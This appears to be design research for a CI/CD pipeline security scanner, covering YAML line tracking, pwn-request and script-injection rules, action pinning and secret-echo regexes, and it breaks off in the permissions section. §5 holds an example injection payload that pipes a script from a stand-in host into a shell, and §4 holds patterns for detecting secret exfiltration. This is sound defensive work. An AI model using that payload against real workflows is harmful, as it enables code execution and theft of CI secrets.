# PipeSentry — CI/CD Pipeline Security Scanner: Implementation Research

Tool: **PipeSentry** — a Python CLI that audits CI/CD pipeline definitions
for security flaws. Two input kinds:

1. **GitHub Actions workflow YAML** (`.github/workflows/*.yml|*.yaml`) —
   triggers, jobs, steps, `permissions:`, `env:`, `uses:` pins, `run:` blocks.
2. **Jenkinsfiles** (Groovy, scanned as text) — plaintext credentials,
   unguarded `sh` steps.

Every finding reports **file + line number + severity + fix**, plus a
text report and a JSON report. A **baseline mode** compares against a saved
baseline and reports only new findings (for CI gating on legacy repos).

Dependencies: **PyYAML only** (same zero-dependency philosophy as
SSTIProbe/RBACLens — `requests` is not needed; this tool is offline and
file-only). Python 3.9+. No network calls: online checks (does this SHA
exist upstream? is this action typosquatted?) are explicitly out of scope
for v1 — see §10.

## Rule catalogue (proposed)

| ID | Check | Severity |
|----|-------|----------|
| PG-001 | `pull_request_target` + checkout of PR head code (pwn request) | Critical |
| PG-002 | `pull_request_target` without checkout (privileged trigger) | High |
| PG-003 | `workflow_run` + checkout / artifact execution | High |
| PG-004 | Script injection: dangerous `${{ }}` in `run:` | Critical |
| PG-005 | Unpinned `uses:` (third-party) | High |
| PG-006 | Unpinned `uses:` (first-party `actions/*`, `github/*`) | Medium |
| PG-007 | Secret echoed to logs (`echo $SECRET`, `printenv`, `set -x`) | Medium / High |
| PG-008 | `permissions: write-all` | High |
| PG-009 | Workflow-level `contents: write` (or any write scope) | High |
| PG-010 | No `permissions:` block at all | Medium |
| PG-011 | `id-token: write` outside a deploy job | Medium |
| PG-012 | `ACTIONS_ALLOW_UNSECURE_COMMANDS=true` | High |
| PG-013 | `actions/checkout` with `persist-credentials: true` + artifact upload | Low |
| PG-014 | Self-hosted runner + untrusted trigger | High |
| PG-015 | Jenkinsfile hardcoded credential (key/password/token) | Critical / High |
| PG-016 | Jenkinsfile unguarded `sh` (Groovy interpolation / docker.sock) | High |
| PG-017 | Jenkinsfile `input` step without `timeout` | Low |

Scoring and exit codes follow RBACLens exactly (§9).

## File layout (proposed)

```
pipesentry.py          # the tool: parsing, checks, scoring, reports, menu
run.py                # launcher: setup / scan / test / doctor (Win/macOS/Linux)
test_pipesentry.py     # step tests (bad + clean fixtures)
requirements.txt      # pyyaml>=6.0, colorama>=0.4.6
test_workflows/bad/   # vulnerable .github/workflows/*.yml fixtures
test_workflows/clean/ # hardened workflows that must pass with zero findings
test_jenkins/bad/     # vulnerable Jenkinsfile fixtures
test_jenkins/clean/   # clean Jenkinsfile fixtures
README.md  DEMO.md  STEP_BY_STEP_GUIDE.md
RESEARCH_CLI_TOOLS.md  RESEARCH_IMPLEMENTATION.md  (this file)
```

---

## 1. Line numbers in PyYAML

### The problem

`yaml.safe_load()` returns plain dicts/lists/strings. All position
information is thrown away, so a finding can say "file X, rule Y" but not
"line 42". Every approach below was tested live in this VM
(Python 3.12, PyYAML 6.x) — the claims are verified, not assumed.

### Three verified gotchas (test before you build)

**Gotcha 1 — `on:` becomes boolean `True`.** PyYAML implements YAML 1.1,
where `on`/`off`/`yes`/`no` resolve to booleans. Verified:

```text
>>> yaml.safe_load("on:\n  push:\n    branches: [main]\n")
{True: {'push': {'branches': ['main']}}}
```

`data["on"]` raises `KeyError`; the key is literally `True`. This bites
every workflow parser built on `safe_load`. (ruamel in YAML 1.2 mode does
NOT do this — `on` stays the string `"on"`.)

**Gotcha 2 — duplicate keys are silently swallowed.** `safe_load` keeps
the last value with no error. For an auditor this is a blind spot (a
second `permissions:` block would hide the first). The StrictLoader
pattern from RBACLens (override `construct_mapping`, raise on a repeated
key) applies here unchanged.

**Gotcha 3 — a step mapping's line is NOT its `uses:` line.** Verified
with `yaml.compose()` on a real workflow:

```
steps[0]:      line=7   (the "- name: Checkout" line)
steps[0]/uses: key-line=8 value-line=8
steps[1]/run:  key-line=10 value-line=10   # block scalar "run: |",
                                           # content starts on line 11
```

So a mapping-level line is the line of the mapping's *first* key, and a
block scalar's `start_mark` is the line of the `run:` key itself, not its
first content line. Any finding inside a multi-line `run:` block needs
`value_start_line + 1 + newlines_before_match` (block style `|`/`>`)
or `value_start_line + newlines_before_match` (flow style). The
`ScalarNode.style` attribute tells you which: `'|'`/`'>'` for block,
`None`/`'"'`/`"'"` for flow.

### Approach A — `yaml.compose()` node tree

`yaml.compose(text)` returns the node tree (`MappingNode` /
`SequenceNode` / `ScalarNode`). Every node carries `start_mark.line`
(0-based) and `end_mark`. Advantages:

- Exact line for **every key and every value**, including the `uses:`
  scalar on its own line (see Gotcha 3).
- No YAML 1.1 boolean resolution: in the node tree the key is the
  plain string `"on"` — Gotcha 1 disappears for free.
- Zero extra dependencies; it is the same PyYAML you already ship.

Disadvantages:

- You must convert nodes to Python values yourself. That means
  re-implementing scalar resolution (strings vs ints vs bools vs null)
  or reusing PyYAML's `SafeConstructor` on the composed nodes
  (`loader.construct_object(node, deep=True)`), which is doable but
  fiddly, and anchors/merge keys need care.
- The check code works on nodes, not dicts, so every check reads
  differently from the RBACLens style (`node.value` pairs instead of
  `data["jobs"]`).

```python
import yaml
from yaml.nodes import MappingNode, SequenceNode, ScalarNode

def node_to_python(node):
    """Compose-tree -> plain Python. Scalar resolution is the manual part:
    everything arrives as a string; 'true'/'42'/'null' stay strings unless
    you resolve them (yaml.safe_load on the single scalar is one shortcut)."""
    if isinstance(node, MappingNode):
        out = {}
        for k_node, v_node in node.value:
            out[node_to_python(k_node)] = node_to_python(v_node)
        return out
    if isinstance(node, SequenceNode):
        return [node_to_python(item) for item in node.value]
    if isinstance(node, ScalarNode):
        return yaml.safe_load(node.value)  # resolves bool/int/null per scalar
    return None

root = yaml.compose(open("ci.yml").read())
# line of the 'uses:' VALUE in steps[0]:
jobs = dict(root.value)["jobs"]            # not real code — see note below
```

Note: `dict(root.value)` does not work directly because keys are nodes;
walk the pairs (`for k, v in node.value`) and compare `k.value`.
This approach is precise but the most code.

### Approach B — custom SafeLoader that attaches line numbers (RECOMMENDED)

Subclass `SafeLoader`, override the three constructors, and stamp every
collection and every string scalar with its line. This is the pattern
Apache Beam ships as `SafeLineLoader` (in production use), and it keeps
`safe_load` semantics: typing, anchors, merge keys, duplicate-key
detection — all still work. One file, ~60 lines, zero new dependencies.

```python
import yaml
from yaml.loader import SafeLoader

class LineLoader(SafeLoader):
    """SafeLoader that stamps every mapping / sequence / string scalar
    with its 1-based source line. Verified pattern (Apache Beam's
    SafeLineLoader, same idea)."""

    class TaggedString(str):
        """A str that also carries ._line_. Compares equal to plain str,
        so all existing string checks keep working."""
        pass

    class TaggedList(list):
        """A list that also carries .__line__. A plain list cannot take
        attributes, so sequences must be wrapped in a subclass — and
        the wrapping must happen in construct_yaml_seq (below), NOT in
        construct_sequence: the stock construct_yaml_seq creates its
        own plain list, yields it, and only extends it with
        construct_sequence's return value, so a TaggedList returned
        from construct_sequence is discarded. And the override must be
        RE-REGISTERED below: SafeLoader bound the stock
        construct_yaml_seq at class creation, so a subclass override
        is silently ignored until add_constructor is called again.
        Verified against PyYAML source + runtime test."""
        pass

    def construct_scalar(self, node):
        value = super().construct_scalar(node)
        if isinstance(value, str):
            value = self.TaggedString(value)
            value._line_ = node.start_mark.line + 1
            # Block scalars (|, >) start content on the NEXT line; the
            # match_line() helper below needs this flag.
            value._block_ = node.style in ("|", ">")
        return value

    def construct_mapping(self, node, deep=False):
        mapping = super().construct_mapping(node, deep=deep)
        mapping["__line__"] = node.start_mark.line + 1
        return mapping

    def construct_yaml_seq(self, node):
        # Generator, mirroring the stock implementation exactly except
        # the yielded object is a TaggedList. The line stamp goes on
        # the yielded object itself — see the TaggedList note above.
        data = self.TaggedList()
        yield data
        data.extend(self.construct_sequence(node))
        data.__line__ = node.start_mark.line + 1


# Re-register the sequence constructor: without this line the override
# above is dead code (see TaggedList note).
LineLoader.add_constructor(
    "tag:yaml.org,2002:seq", LineLoader.construct_yaml_seq)

def load_with_lines(text):
    return yaml.load(text, Loader=LineLoader)
```

Rules for using it:

- **Mapping line** = line of the mapping's first key. Correct for
  findings about the mapping itself (a whole step, a whole job, the
  `permissions:` block).
- **Scalar line** = exact line of that scalar. Correct for `uses:` values
  (`step["uses"]._line_`), for `run:` values, and for the `on:` key
  itself. This is how PG-005 reports the exact `uses:` line.
- **Multi-line `run:` matches**: the `run:` scalar's `._line_` is the
  line of the `run:` key. A `${{ }}` match at character offset `i`
  inside the value sits on line
  `value._line_ + value[:i].count("\n") + (1 if block-style else 0)`.
  The loader records block style in `._block_` for exactly this
  formula:

```python
def match_line(value, match_start):
    """1-based file line of a regex match inside a YAML scalar value."""
    line = value._line_ + value[:match_start].count("\n")
    if getattr(value, "_block_", False):
        line += 1
    return line
```

- **The `__line__` key pollutes dicts.** Every mapping gains a
  `"__line__"` key. Guard every iteration over a mapping's keys
  (`if key == "__line__": continue`) or strip the keys once, right
  after loading, into a side table `{id(mapping): line}`. RBACLens
  already strips nothing — it never injects keys — so decide at build
  time; the side-table variant is cleaner for JSON output (a finding
  must never print `__line__` as if it were workflow data). Recommended:
  keep `__line__` during checks, strip it in the report builder.
- **The `on:` gotcha still applies** (this loader still resolves YAML
  1.1 booleans). Fix it in one place, right after load:

```python
def load_workflow(text):
    data = yaml.load(text, Loader=LineLoader)
    if True in data:                      # YAML 1.1 parsed "on:" as True
        data["on"] = data.pop(True)
    return data
```

  `on` only ever appears at the top level of a workflow, so a top-level
  fix is complete. (Alternative: remove `on`/`off` from the bool
  resolver in the loader — more invasive, same result.)

### Approach C — ruamel.yaml (round-trip)

```python
from ruamel.yaml import YAML
yaml = YAML(typ="safe")          # or typ="rt" for round-trip
data = yaml.load(open("ci.yml"))
data.lc.key("on")                # line of the 'on' key (0-based)
data["jobs"]["test"].lc.key("steps")
data["jobs"]["test"]["steps"][0].lc.key("uses")   # exact uses: line
seq = data["jobs"]["test"]["steps"]
seq.lc.item(0)                   # (line, col) of steps[0]
```

Advantages: built-in, per-key **and** per-value lines
(`lc.key(k)` vs `lc.value(k)`), YAML 1.2 so `on` stays a string,
comment preservation. Disadvantages: an extra dependency
(ruamel was **not** installed in the build VM — PyYAML was), slower,
`CommentedMap`/`CommentedSeq` subclasses instead of plain dict/list,
and the `lc` API only exists on collections (scalar lines need
`lc.value()`), so you still write accessor helpers. The 0.11.x line
also changed loader behaviour between versions, which is a maintenance
risk for a student tool.

### Recommendation

**Approach B (custom SafeLoader) as the only loader.** Reasons:

1. Zero new dependencies — `requirements.txt` stays `pyyaml` +
   `colorama`, exactly like SSTIProbe/RBACLens.
2. It keeps `safe_load` semantics, so duplicate-key rejection, anchor
   handling and the RBACLens test fixtures all transfer directly.
3. Scalar-level lines (`uses:`, `run:`) are exact, which is what the
   report needs; the only manual part is the block-scalar `+1`, handled
   by `match_line()` above.
4. Approach A (compose) is the fallback if per-key lines for *every*
   key become necessary — but B already gives per-key lines through the
   scalar's own `._line_`, because every mapping *value* is a tagged
   scalar or a stamped collection.

One loader, used for every workflow file; Jenkinsfiles are plain text
(§7) and never go through YAML at all.

---

## 2. GitHub Actions `on:` trigger parsing

### The forms `on:` can take

GitHub's workflow syntax allows all of these, and a scanner must
normalise them to one shape before any check runs:

```yaml
on: push                                  # scalar: one event
on: [push, pull_request_target]           # flow sequence
on:
  - push
  - pull_request_target                   # block sequence
on:
  pull_request_target:                    # mapping, no config
on:
  pull_request_target:                    # mapping, with config
    types: [opened, synchronize]
on:
  workflow_dispatch:
    inputs:
      target: {description: "x", required: true}
```

Plus the other triggers that matter for privilege analysis:
`pull_request`, `workflow_run`, `workflow_call`, `issue_comment`,
`issues`, `pull_request_review`, `schedule`, `release`, `push`.
(`workflow_call` makes the workflow *reusable* — its `uses:` lines are
still checked by PG-005, and its `inputs:`/`secrets:` are attacker
influence only if the caller passes them.)

### Normalisation sketch

```python
def normalise_triggers(data):
    """Return {event_name: config_or_None} for every trigger, whatever
    form 'on:' was written in. Handles the YAML 1.1 True-key gotcha
    (see §1) — call after load_workflow(), which already renames it."""
    on = data.get("on", {}) or {}
    if isinstance(on, str):                 # on: push
        return {on: None}
    if isinstance(on, list):                # on: [push, pull_request_target]
        return {event: None for event in on}
    if isinstance(on, dict):                # on: {pull_request_target: {...}}
        return dict(on)
    return {}

TRIGGERS_PRIVILEGED = {"pull_request_target", "workflow_run"}
TRIGGERS_UNTRUSTED = {"pull_request_target", "workflow_run",
                      "issue_comment", "pull_request_review"}
```

Edge cases to test in fixtures:

- `on: {pull_request_target: {types: [labeled]}}` — still privileged;
  `types:` never makes it safe. (A `labeled`-only workflow is still
  exploitable: anyone can open a PR, a maintainer adding a label then
  triggers it — the code run is still fork code.)
- `on: workflow_run` with `workflows: ["CI"]` — privileged, but the
  danger is *artifact* execution, not checkout: the `workflow_run` job
  runs on the default branch, so checking out the base branch is safe;
  downloading and executing the *artifact* of the untrusted run is the
  exploit. PG-003 must look for `actions/download-artifact` +
  `run:` in the same job, not just any checkout.
- A workflow with **no** `on:` key is invalid; report a parse-level
  finding (Low) rather than crashing.
- `on: pull_request` (not `_target`) is the safe trigger: fork code
  runs with no secrets and a read-only token. Never flag it.

### Finding a checkout step (PG-001)

A checkout is any step, in any job, whose `uses:` starts with
`actions/checkout` (any ref — pinned or not; pinning does not make a
pwn request safe). Walk every job:

```python
def iter_steps(data):
    """Yield (job_id, step_index, step_dict, step_line) for every step
    in every job. step_line is the step mapping's __line__."""
    for job_id, job in (data.get("jobs") or {}).items():
        for i, step in enumerate(job.get("steps") or []):
            yield job_id, i, step, step.get("__line__")

def find_checkouts(data):
    out = []
    for job_id, i, step, line in iter_steps(data):
        uses = step.get("uses") or ""
        if uses.split("@")[0].strip() == "actions/checkout":
            out.append((job_id, i, step, line))
    return out
```

PG-001 fires when **both** hold:

1. `pull_request_target` is in the normalised triggers, **and**
2. any checkout step exists in any job, **and** the checkout can reach
   fork code — i.e. any of:
   - the checkout has **no** `ref:` input (see note below), or
   - `ref:` is `${{ github.event.pull_request.head.sha }}`,
     `${{ github.event.pull_request.head.ref }}`, or any expression
     containing `head.sha` / `head.ref` / `merge`, or
   - a `run:` step in the same job does `git checkout`, `git clone`,
     or `gh repo clone` of the PR (secondary signal, Medium — the
     checkout action is the primary one).

Note on the no-`ref:` case: since 2025-12-08 `pull_request_target`
always takes the workflow file and checkout commit from the **default
branch**, so a plain `actions/checkout` with no `ref:` checks out
*trusted* default-branch code. And since checkout v7.0.0 (2026-06-18,
backported to v6.1.0/v5.1.0/v4.4.0/v3.7.0/v2.8.0) the action itself
*refuses* fork-PR checkouts in privileged triggers unless
`allow-unsafe-pr-checkout: true` is set. So the precise rule is:

- PG-001 **Critical**: checkout with `ref:` pointing at PR head/merge,
  or `allow-unsafe-pr-checkout: true` anywhere, or a `run:`-block
  `git clone`/`git checkout` of the PR in the same job.
- PG-001 **High** (downgraded, still flag): plain checkout with no
  `ref:` in a `pull_request_target` workflow on an *old* checkout
  version (unpinned or pinned below the backport) — the defence depends
  on the action version, so flag it and say why.
- No checkout at all + `pull_request_target` = PG-002 (High): the
  workflow still runs with secrets; any `run:` step that touches
  `github.event.*` data is then also a PG-004 candidate.

Evidence to record: the trigger line, the checkout step line, and the
`ref:` value. The fix text is always the same: split the workflow —
run untrusted code under `pull_request` (no secrets), and do the
privileged part (commenting, labelling, publishing results) in a
separate `workflow_run` job that only downloads a *bounded, validated*
artifact.

---

## 3. Action pinning rules (PG-005 / PG-006)

### What counts as pinned

GitHub's own secure-use reference: "a full-length commit SHA is
currently the only way to use an action as an immutable release".
The test is purely syntactic — no network needed:

```python
import re
SHA_RE = re.compile(r"^[0-9a-f]{40}$")          # full SHA-1, lowercase hex
SHA256_RE = re.compile(r"^[0-9a-f]{64}$")       # future-proof: SHA-256 repos

def parse_uses(uses):
    """Split 'owner/repo[/path]@ref [# comment]' into parts.
    Returns dict or None if the value is not a remote action."""
    if not isinstance(uses, str):
        return None
    uses = uses.strip()
    if uses.startswith("./") or uses.startswith("docker://"):
        return {"kind": "local" if uses.startswith("./") else "docker",
                "raw": uses}
    m = re.match(r"^(?P<owner>[^/\s]+)/(?P<repo>[^/\s@]+)"
                 r"(?P<path>/[^@\s]*)?@(?P<ref>[^\s#]+)"
                 r"\s*(?:#\s*(?P<comment>.*))?$", uses)
    if not m:
        return {"kind": "malformed", "raw": uses}
    d = m.groupdict()
    d["kind"] = "remote"
    return d

def pin_status(ref):
    if SHA_RE.match(ref) or SHA256_RE.match(ref):
        return "pinned"
    return "unpinned"
```

### Classification table — every `uses:` form

| `uses:` value | Verdict | Rule / severity |
|---|---|---|
| `actions/checkout@11bd71901b...` (40-hex) | Pinned | — |
| `actions/checkout@11bd71901b... # v4.2.1` | Pinned, with version comment (ideal: Dependabot reads the comment to open update PRs) | — |
| `actions/checkout@v4` (major tag) | Unpinned — tag is mutable | PG-006 Medium (first-party) |
| `actions/checkout@v4.2.1` (full semver tag) | Unpinned — tags can be moved; `v4.2.1` is *safer* than `v4` but still mutable | PG-006 Medium |
| `tj-actions/changed-files@v45` | Unpinned | PG-005 High (third-party) |
| `owner/action@main` / `@master` / `@latest` | Unpinned — branch, moves on every push | PG-005 High / PG-006 Medium |
| `owner/action@feature/foo` | Unpinned — branch | same as above |
| `owner/action` (no `@` at all) | Unpinned — resolves to default branch | same as above |
| `docker://alpine:3.19` | Docker action — tag is mutable, same problem, different syntax | PG-005 High (report as docker action; fix: `docker://alpine@sha256:<digest>`) |
| `docker://image@sha256:abc...` | Pinned (digest) | — |
| `./.github/actions/my-action` | Local action — runs repo code, nothing to pin | — (never flag) |
| `./local-action` | Local action | — |
| `owner/repo/.github/workflows/reuse.yml@<ref>` | Reusable workflow — same pinning rules as actions | PG-005/PG-006 by owner |
| `owner/action@<short-sha>` (e.g. 7 hex chars) | **Not pinned** — a short SHA is ambiguous and GitHub resolves it; require the full 40 | Unpinned (say "short SHA, use the full 40") |
| `owner/action@<40-hex>` but the trailing `# vX` comment names a *different* major than the SHA is known for | Cannot verify offline — **do not flag** (needs the API). Note as a limitation (§10). | — |

Real-world anchor for the fix text: the March 2025
`tj-actions/changed-files` compromise (CVE-2025-30066, CVSS 8.6) —
attackers rewrote the version tags to point at malicious code and
23,000+ repositories ran it, dumping secrets into logs. That is the
one-sentence justification to put in every PG-005 fix message.

### First-party vs third-party

```python
FIRST_PARTY = {"actions", "github"}   # GitHub-authored actions

def is_first_party(owner):
    return owner in FIRST_PARTY
```

- **Third-party** (`tj-actions/*`, `aws-actions/*`, `docker/*`, any
  other owner): unpinned = **High** (PG-005). This is the
  supply-chain attack surface.
- **First-party** (`actions/*`, `github/*`): unpinned = **Medium**
  (PG-006). GitHub controls these repos, so tag-moving requires
  compromising GitHub itself — lower risk, but still mutable, and
  zizmor flags them too. Provide a `--strict` flag that escalates
  PG-006 to High for teams that want it (zizmor's default behaviour).
- **Local** (`./...`): never flag — there is no remote code to pin.
- **Docker** (`docker://...`): treat the image tag like an action tag;
  only a `@sha256:` digest counts as pinned.

Also flag the *combination* that matters for CI gating: a workflow
that is otherwise clean but has one unpinned third-party action in a
job that also has `contents: write` or secrets — the report should
surface that job as the highest-risk job (the score already does this
indirectly, since both findings cost points).

---

## 4. Secret-echo detection (PG-007)

### What actually prints secrets to logs

GitHub automatically masks values of registered secrets in logs — so
echoing a secret is not an instant leak. It is still a finding, because
masking is bypassable and fragile:

- `echo ${SECRET:0:4}...` — substring of a secret is **not** masked.
- `echo $SECRET | base64` / `xxd` / `od` — encoded forms are **not**
  masked.
- `printenv` / `env` / `set -x` dump the *whole* environment, including
  secrets that were never meant to be printed; multi-line secrets and
  secrets split across lines defeat the masker.
- A secret passed to a command that prints its arguments on failure
  (e.g. `curl -v`) leaks it.

Severity policy: plain `echo $SECRET` = **Medium** (masking usually
saves you, but the pattern is wrong); `printenv` / bare `env` /
`set -x` in a step whose environment can contain secrets = **High**
(the whole environment is dumped, masking is unreliable).

### Where to look

Secrets reach a `run:` block three ways, and the check must cover all
three — the naive check (only `run:` text) misses the commonest real
case:

1. **Inline expression**: `run: echo ${{ secrets.MY_TOKEN }}`
2. **Environment variable**: `env: MY_TOKEN: ${{ secrets.MY_TOKEN }}`
   at step/job/workflow level, then `run: echo $MY_TOKEN` (or
   `echo ${MY_TOKEN}`, `echo "${MY_TOKEN}"`). Note: passing a secret
   through `env:` is the **correct** pattern for *injection* (§5) —
   it is only a finding if the step then *prints* it.
3. **Step outputs / files**: `echo "::add-mask::$SECRET"` is the
   *mitigation*, not a finding — but its **absence** next to an echo
   is not itself a finding either (GitHub auto-masks registered
   secrets). Do not flag "no add-mask" on its own; too noisy.

Implementation: for each step, collect the set of secret-bearing
variable names visible to it (step `env:` + job `env:` + workflow
`env:`, where the value contains `secrets.`), then scan the step's
`run:` text for prints of those names.

### Regexes

```python
import re

# A name that looks like it holds a secret (for the env-var heuristic).
SECRET_NAME_RE = re.compile(
    r"(SECRET|TOKEN|PASSWOR?D|PASSWD|API[_-]?KEY|PRIVATE[_-]?KEY|"
    r"CREDENTIAL|AWS_SECRET|CLIENT_SECRET|AUTH)", re.IGNORECASE)

# 1. Direct expression echo: echo ... ${{ secrets.X }}
ECHO_EXPR_RE = re.compile(
    r"\becho\b[^\n;|&]*\$\{\{\s*secrets\.[A-Za-z0-9_.-]+\s*\}\}")

# 2. Echo of a secret-bearing variable: echo $TOKEN, echo ${TOKEN}, echo "$TOKEN"
def echo_var_re(var_names):
    names = "|".join(re.escape(n) for n in var_names)
    return re.compile(r"\becho\b[^\n;|&]*\$(\{)?(" + names + r")\}?\b")

# 3. Whole-environment dumps (anywhere in the step, any shell)
PRINTENV_RE = re.compile(r"(?m)^\s*(printenv|env)\s*(?:[|;&\n]|$)")
SETX_RE = re.compile(r"(?m)^\s*set\s+(-[^ \n]*x|--xtrace)\b")

# 4. Encoded exfiltration of a secret-bearing variable (masking bypass)
ENCODED_ECHO_RE = re.compile(
    r"\becho\b[^\n]*\$(\{)?(SECRET|TOKEN|PASSWOR?D)[A-Z0-9_]*\}?"
    r"[^\n]*\|\s*(base64|xxd|od|rev|tr|sed|awk)\b", re.IGNORECASE)

# 5. Secret in a URL / curl auth (also a leak: URLs are logged by curl -v
#    and by proxies). Flag, Medium.
CURL_AUTH_RE = re.compile(
    r"curl[^\n]*(-u\s+|--user\s+)[^\s]+:[^\s]+")
```

Worked example of the step analysis:

```python
def secret_vars_visible(step, job_env, workflow_env):
    """Names of env vars whose value contains a secrets.* expression,
    visible to this step (step env wins over job env wins over workflow)."""
    visible = {}
    for env in (workflow_env, job_env, step.get("env") or {}):
        for name, value in (env or {}).items():
            if isinstance(value, str) and "secrets." in value:
                visible[name] = value
    return visible

def check_secret_echo(step, job_env, workflow_env, run_text, run_line):
    findings = []
    visible = secret_vars_visible(step, job_env, workflow_env)
    if ECHO_EXPR_RE.search(run_text):
        findings.append(("PG-007", "Medium",
            "Secret interpolated directly in run: — pass it via env: and never echo it"))
    if visible and echo_var_re(visible).search(run_text):
        findings.append(("PG-007", "Medium",
            "Secret-bearing variable echoed to logs: %s" % ", ".join(visible)))
    if PRINTENV_RE.search(run_text) and (visible or "secrets." in run_text):
        findings.append(("PG-007", "High",
            "printenv/env dumps the whole environment including secrets"))
    if SETX_RE.search(run_text) and visible:
        findings.append(("PG-007", "High",
            "set -x prints every command with variables expanded — secrets leak"))
    return findings
```

Fix text for every PG-007: remove the echo; if the value must be
inspected, print only a truncated hash (`echo "${SECRET:0:4}..."` is
still a leak — say instead: don't print it at all; use
`::add-mask::` *before* any command that might print it, and prefer
`env:` + quoted `"$VAR"` references).

---

## 5. Script-injection detection (PG-004)

### Why it works

GitHub substitutes `${{ }}` expressions into the workflow file
**before** the runner's shell sees the script. A PR title of
`"; curl evil.example/x | sh; #` becomes shell code. Quoting does not
help — the substitution happens before quoting is evaluated. The only
fix is to pass the value through `env:` and reference `"$VAR"` in the
script, where the shell treats it as data.

```yaml
# BAD — injection
- run: echo "Thanks: ${{ github.event.pull_request.title }}"
# GOOD — data, not code
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Thanks: $PR_TITLE"
```

The same rule applies to `actions/github-script` steps: an expression
inside `with: script:` is JS injection, not shell injection — flag it
the same way, with the fix "read it from `process.env`".

### Which expressions are dangerous

Attacker-controlled = any value a person who cannot write to the repo
can set. Tiered, because the report should not cry Critical for
`github.sha`:

**Tier 1 — Critical (directly attacker-controlled, no permission needed
to set):**

```python
DANGEROUS_EXACT = {
    # PR content (fork author controls all of these)
    "github.event.pull_request.title",
    "github.event.pull_request.body",
    "github.event.pull_request.head.ref",      # fork branch name
    "github.event.pull_request.head.label",
    # Issue / comment / review content
    "github.event.issue.title",
    "github.event.issue.body",
    "github.event.comment.body",
    "github.event.review.body",
    "github.event.review_comment.body",
    "github.event.discussion.title",
    "github.event.discussion.body",
    # Commit content (author of a pushed commit)
    "github.event.head_commit.message",
    "github.event.head_commit.author.name",
    "github.event.head_commit.author.email",
    "github.event.commits",                    # any .message inside
    # Branch names (fork author names their branch)
    "github.head_ref",
    # Workflow inputs supplied by whoever triggers the run
    "github.event.inputs",                     # workflow_dispatch inputs
    "inputs",                                  # workflow_call / dispatch inputs
    "github.event.workflow_run.head_branch",
}
DANGEROUS_PREFIXES = (
    "github.event.pull_request.title",
    "github.event.pull_request.body",
    "github.event.issue.",
    "github.event.comment.",
    "github.event.review",
    "github.event.head_commit.",
    "github.event.commits",
    "github.event.inputs.",
    "inputs.",
    "github.head_ref",
    "github.event.pull_request.head.",
)
```

**Tier 2 — High (attacker-influenced, needs some access or a
specific setup):**

- `github.ref_name` — branch/tag name. On `push` the actor needs
  write access to create the branch, so it is not a fork attack; but
  on `pull_request` it is the head branch name. Flag High with the
  note "branch name — only dangerous if untrusted users can create
  branches".
- `github.event.pull_request.base.ref` — base branch, maintainer-set;
  Low, usually safe. Do **not** flag (it is the target branch).
- `github.event.sender.login` — a username; GitHub usernames cannot
  contain shell metacharacters, so this is safe. Do not flag.

**Safe — never flag (but see the note on `secrets.*`):**

```python
SAFE_PREFIXES = (
    "github.sha", "github.run_id", "github.run_number", "github.run_attempt",
    "github.event.number", "github.event.pull_request.number",
    "github.repository", "github.repository_owner",
    "github.workflow", "github.job", "github.action",
    "github.event_name", "github.ref",        # refs/pull/N/merge or refs/heads/<branch>
    "vars.",                                  # repo/org variables: maintainer-set
    "secrets.",                               # NOT injection — see below
    "env.", "job.", "steps.", "needs.", "matrix.",
    "github.token",                           # the token itself, not user data
)
```

Note on `github.ref`: for a `pull_request` event it is
`refs/pull/N/merge` (safe); for `push` it is `refs/heads/<branch>`
(branch name — Tier 2 in effect). If you want zero false positives,
treat bare `github.ref` as safe and only flag `github.ref_name`.

Note on `secrets.*`: a secret in `run:` is **not** script injection
(the value is not attacker-controlled — it is your own secret). It is
a PG-007 secret-echo finding instead. Do not double-flag it as PG-004.

### Detection sketch

```python
import re

EXPR_RE = re.compile(r"\$\{\{\s*(.+?)\s*\}\}", re.DOTALL)

def expr_is_dangerous(inner):
    """inner = text inside ${{ }}. Returns (tier, matched) or None."""
    inner = inner.strip()
    # Strip common safe wrappers that do NOT sanitise: format(), join(),
    # fromJSON(), toJSON(), contains(), startsWith() — none of these stop
    # shell metacharacters, so look at the expression inside the call.
    m = re.match(r"^(?:format|join|fromJSON|toJSON|contains|startsWith|"
                 r"endsWith|hashFiles)\s*\((.*)\)$", inner, re.DOTALL)
    if m:
        inner = m.group(1)
    first = inner.split(",")[0].strip().strip("'\"")
    for bad in DANGEROUS_PREFIXES:
        if first == bad or first.startswith(bad):
            return ("Critical", first)
    if first.startswith("github.ref_name"):
        return ("High", first)
    return None

def check_run_block(run_text, run_line, step_line):
    """Scan one run: value. Returns findings with exact lines (§1)."""
    findings = []
    for m in EXPR_RE.finditer(run_text):
        hit = expr_is_dangerous(m.group(1))
        if hit:
            tier, expr = hit
            line = match_line(run_text, m.start())   # §1 helper
            findings.append(("PG-004", tier,
                "Untrusted expression ${{ %s }} interpolated in run: — "
                "move it to env: and use \"$VAR\"" % expr, line))
    return findings
```

False-positive controls (test these in fixtures):

- `${{ github.event.pull_request.title }}` inside `env:` is the **fix**,
  not a finding — only scan `run:` values (and `with: script:` for
  `github-script` steps). Never scan `env:` values.
- An expression already assigned to `env:` and then used as `$VAR`
  in `run:` is safe — the check only looks at `${{ }}` text, so this
  falls out naturally.
- Multi-line `run: |` blocks: use `match_line()` (§1) so the reported
  line is the line of the `${{ }}` itself, not the `run:` line.
- `if:` conditions (`if: ${{ github.event... }}`) are evaluated by
  GitHub's expression engine, not a shell — **do not scan `if:`**.
  (An `if:` can still be logic abuse, but it is not shell injection.)

---

## 6. Permissions check (PG-008 – PG-011)

### The model (GitHub docs, verified Nov 2026)

- 17 scopes exist (e.g. `actions`, `attestations`, `checks`,
  `contents`, `deployments`, `discussions`, `id-token`, `issues`,
  `packages`, `pages`, `pull-requests`, `repository-projects`,
  `security-events`, `statuses`, `vulnerability-alerts`,
  `copilot-requests`). Most take `read` / `write` / `none`;
  `id-token` and `copilot-requests` take only `write` / `none`;
  `vulnerability-alerts` takes only `read` / `none`.
- `write` includes `read`. Three shorthands: `read-all`, `write-all`,
  and `permissions: {}` (every scope `none`).
- **The replacement rule (the one that catches people):** as soon as
  you specify *any* permission, every scope you did not name is set to
  `none`. A **job-level** block therefore **replaces** the
  workflow-level block for that job — it does not add to it. A job that
  adds `pull-requests: write` without repeating `contents: read` can
  no longer check out a private repo.
- **No block at all** means the repo/org default applies. New orgs
  default to read-only; older orgs and repos may still default to
  **read and write** — so a workflow with no block is un-auditable
  from the file alone, and must be flagged (PG-010, Medium) with the
  fix "declare it explicitly; don't depend on the repo default".

### Effective permissions (compute per job)

```python
WRITE_SCOPES = {"contents", "issues", "pull-requests", "packages",
                "deployments", "statuses", "actions", "checks",
